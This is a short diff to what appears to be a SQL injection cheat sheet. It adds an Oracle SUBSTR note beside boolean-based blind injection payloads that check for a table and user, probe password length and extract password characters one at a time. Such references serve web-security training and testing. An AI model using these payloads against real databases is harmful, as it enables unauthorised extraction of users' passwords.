@@ -55,6 +55,7 @@
                                   : ' AND (SELECT 'a' FROM put_table_name_here WHERE username='put_username_here')='a' --
                                   : ' AND (SELECT 'a' FROM put_table_name_here WHERE username='put_username_here' AND LENGTH(password)>1)='a'
                                   : ' AND (SELECT SUBSTRING(password,1,1) FROM put_table_name_here WHERE username='put_username_here')='a'
+                                      (for oracle SUBSTR)
 ```
 #### With Conditional Errors
 ```
